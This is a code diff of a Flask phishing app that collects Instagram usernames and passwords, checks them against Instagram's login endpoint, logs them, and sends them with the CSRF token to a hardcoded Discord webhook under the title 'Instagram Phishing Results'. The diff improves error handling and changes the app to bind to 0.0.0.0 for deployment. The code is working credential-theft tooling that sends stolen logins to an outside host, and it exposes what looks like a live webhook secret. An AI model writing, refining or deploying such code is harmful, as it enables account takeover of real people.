@@ -8,12 +8,11 @@ app = Flask(__name__)
 # Discord webhook URL
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1262124533792505988/MB-TafqEqT_IYNxcwu_tymVFyJVOc6izi0S2BjU5ZVoJ-AUaz9qyrmIy7-GbBHBvxxiz'
 
-
 logging.basicConfig(filename='app.log', level=logging.INFO, format='%(asctime)s - %(message)s')
 
 def send_discord_webhook(username, password, follower_count, csrf_token):
     webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
-
+    
     embed = DiscordEmbed(title="Instagram Phishing Results - 4vzdev", color='03b2f8')
     embed.add_embed_field(name="Username", value=username)
     embed.add_embed_field(name="Password", value=password)
@@ -21,7 +20,7 @@ def send_discord_webhook(username, password, follower_count, csrf_token):
     embed.add_embed_field(name="CSRF Token", value=csrf_token)
 
     webhook.add_embed(embed)
-    response = webhook.execute()
+    webhook.execute()
 
 def check_instagram_login(username, password):
     session = requests.Session()
@@ -30,6 +29,9 @@ def check_instagram_login(username, password):
     login_page_response = session.get(login_page_url)
 
     csrf_token = login_page_response.cookies.get('csrftoken')
+    if not csrf_token:
+        logging.error('CSRF token not found.')
+        return False
 
     login_url = 'https://www.instagram.com/accounts/login/ajax/'
     payload = {
@@ -46,21 +48,19 @@ def check_instagram_login(username, password):
         'X-Requested-With': 'XMLHttpRequest'
     }
 
-    login_response = session.post(login_url, data=payload, headers=headers, allow_redirects=True)
+    login_response = session.post(login_url, data=payload, headers=headers)
 
     if login_response.status_code == 200 and login_response.json().get('authenticated'):
-        
-        follower_count = 31  # man i cba adding that hsit :Skull:
+        follower_count = 31  # Placeholder value
 
-        
         log_message = f"Account was saved from scams! Username: {username}, Password: {password}, Followers: {follower_count}"
         logging.info(log_message)
 
-        
         send_discord_webhook(username, password, follower_count, csrf_token)
 
         return True
     else:
+        logging.error('Login failed or authentication unsuccessful.')
         return False
 
 @app.route('/')
@@ -79,4 +79,4 @@ def check_login():
         return jsonify(success=False)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=10000, debug=True)  # Cambié el puerto para que coincida con el valor que usas en Gunicorn
